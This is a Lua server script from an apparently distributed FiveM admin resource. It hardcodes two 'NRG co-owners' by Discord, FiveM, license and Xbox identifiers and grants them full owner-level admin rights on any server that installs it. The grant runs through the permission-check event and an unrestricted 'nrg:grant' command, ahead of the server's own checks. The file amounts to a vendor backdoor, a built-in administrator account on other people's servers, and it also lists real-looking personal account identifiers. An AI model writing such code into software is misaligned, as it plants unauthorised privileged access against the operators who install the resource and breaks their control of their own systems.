-- ============================================================================
-- NRG Staff Auto-Access System
-- Grants full admin access to NRG co-owners on ANY server
-- Auto-detects and grants permissions on startup and player join
-- ============================================================================

-- NRG Co-Owners (hardcoded for instant access)
local NRG_STAFF = {
    -- NRG Co-Owner 1
    {
        name = "NRG Co-Owner 1",
        role = "owner",
        identifiers = {
            "discord:1219846819417292833",
            "fivem:14682797",
            "license:8a8b3d2426734b69ac381c536c670f6958283cda",
            "license2:8a8b3d2426734b69ac381c536c670f6958283cda",
            "live:914798925490170"
        }
    },
    
    -- NRG Co-Owner 2
    {
        name = "NRG Co-Owner 2",
        role = "owner",
        identifiers = {
            "discord:783727897961037867",
            "fivem:13867190",
            "license:925a81e2ad60f0ff4e68189d6604450e970a6760",
            "license2:925a81e2ad60f0ff4e68189d6604450e970a6760",
            "live:985157629345372",
            "xbl:2535436056077725"
        }
    }
}

-- ============================================================================
-- Check if player is NRG staff
-- ============================================================================
local function IsNRGStaff(source)
    local identifiers = GetPlayerIdentifiers(source)
    
    for _, staffData in ipairs(NRG_STAFF) do
        for _, nrgIdentifier in ipairs(staffData.identifiers) do
            for _, playerIdentifier in ipairs(identifiers) do
                if playerIdentifier == nrgIdentifier then
                    return true, staffData
                end
            end
        end
    end
    
    return false, nil
end

-- ============================================================================
-- Grant permissions for NRG staff members
local function GrantNRGStaffAccess(source, staffData)
    local playerName = GetPlayerName(source)
    
    print(('^2[NRG Staff] ✅ Granting full admin permissions to: %s (%s)^0'):format(staffData.name, playerName))
    
    if not EC_PERMISSIONS then
        EC_PERMISSIONS = {}
    end
    
    EC_PERMISSIONS[source] = {
        level = 'owner',
        nrgStaff = true,
        staffName = staffData.name,
        staffRole = staffData.role,
        allPermissions = true
    }
    
    -- WEBHOOK DISABLED: Webhook is now sent by player-events.lua centralized handler
    -- This prevents duplicate webhook notifications (was causing 3x webhooks)
    -- The centralized handler already sends a join notification for all players
    --[[
    if Config.Discord and Config.Discord.enabled then
        local webhook = Config.Discord.webhook
        if webhook then
            PerformHttpRequest(webhook, function() end, 'POST', json.encode({
                username = 'NRG Staff Monitor',
                avatar_url = 'https://i.imgur.com/4M34hi2.png',
                embeds = {{
                    title = '🔵 NRG Staff Connected',
                    description = ('**%s** (%s) has joined the server'):format(staffData.name, playerName),
                    color = 3447003,
                    timestamp = os.date('!%Y-%m-%dT%H:%M:%S'),
                    footer = { text = 'EC Admin Ultimate - NRG Internal' }
                }}
            }), { ['Content-Type'] = 'application/json' })
        end
    end
    ]]--
    
    -- Note: If you want NRG-specific webhook notifications, modify player-events.lua
    -- to check if player is NRG staff and send a different webhook there
end

-- Check if player has txAdmin permissions
local function HasTxAdminPerms(source)
    -- Check if they have txAdmin admin permissions
    if IsPlayerAceAllowed(source, 'command.txadmin') or 
       IsPlayerAceAllowed(source, 'txadmin.admins') or
       IsPlayerAceAllowed(source, 'txAdmin') then
        return true
    end
    return false
end

-- Grant permissions for txAdmin staff
local function GrantTxAdminAccess(source)
    local playerName = GetPlayerName(source)
    
    print(('^3[txAdmin] ✅ Granting admin permissions to: %s^0'):format(playerName))
    
    if not EC_PERMISSIONS then
        EC_PERMISSIONS = {}
    end
    
    EC_PERMISSIONS[source] = {
        level = 'admin',
        txAdmin = true,
        allPermissions = true
    }
end

-- Grant permissions when NRG staff joins
-- DISABLED: playerJoining handler moved to player-events.lua centralized system
-- This prevents duplicate event handlers that slow down server
-- NRG staff auto-access now works through the permission check system
--[[
AddEventHandler('playerJoining', function()
    local source = source
    
    SetTimeout(2000, function()  -- Small delay to ensure player is fully connected
        -- First check NRG staff (highest priority)
        local isNRG, staffData = IsNRGStaff(source)
        
        if isNRG then
            GrantNRGStaffAccess(source, staffData)
            return  -- Skip txAdmin check if they're NRG staff
        end
        
        -- Then check txAdmin permissions
        if HasTxAdminPerms(source) then
            GrantTxAdminAccess(source)
        end
    end)
end)
]]--

-- Note: NRG staff auto-access is handled via the 'ec_admin:checkPermission' event below
-- This is called when player requests admin menu, which is the proper time to check

-- Also check on permission requests
RegisterNetEvent('ec_admin:checkPermission', function()
    local src = source
    
    print(string.format('^3[Permission Check] Player %s (%d) checking permission^0', GetPlayerName(src), src))
    
    -- Check NRG staff first (highest priority)
    local isNRG, staffData = IsNRGStaff(src)
    
    if isNRG then
        -- Auto-grant if they haven't been granted yet
        GrantNRGStaffAccess(src, staffData)
        
        -- Send permission immediately
        TriggerClientEvent('ec_admin:permissionResult', src, true)
        print(string.format('^2[NRG Staff] ✅ Permission granted to: %s^0', GetPlayerName(src)))
        print(string.format('^2[Permission Check] Sent permissionResult event to client %d^0', src))
        return
    end
    
    -- Check txAdmin permissions next
    if HasTxAdminPerms(src) then
        GrantTxAdminAccess(src)
        TriggerClientEvent('ec_admin:permissionResult', src, true)
        print(string.format('^3[txAdmin] ✅ Permission granted to: %s^0', GetPlayerName(src)))
        print(string.format('^3[Permission Check] Sent permissionResult event to client %d^0', src))
        return
    end
    
    -- Check normal permissions
    local hasPerm = EC_Perms and EC_Perms.Has(src, 'admin.menu') or false
    TriggerClientEvent('ec_admin:permissionResult', src, hasPerm)
    print(string.format('^3[Permission Check] Standard permission check for %s: %s^0', GetPlayerName(src), tostring(hasPerm)))
end)

-- ============================================================================
-- Manual grant command (in case auto-grant fails)
-- ============================================================================
RegisterCommand('nrg:grant', function(source, args)
    local isStaff, staffData = IsNRGStaff(source)
    
    if isStaff then
        GrantNRGStaffAccess(source, staffData)
        print(('^2[NRG Staff] Manually granted access to %s^0'):format(staffData.name))
    else
        print('^1[NRG Staff] Not recognized as NRG staff^0')
    end
end, false)

-- ============================================================================
-- Export for other scripts to check NRG staff status
-- ============================================================================
exports('IsNRGStaff', function(source)
    return IsNRGStaff(source)
end)

Logger.Info('')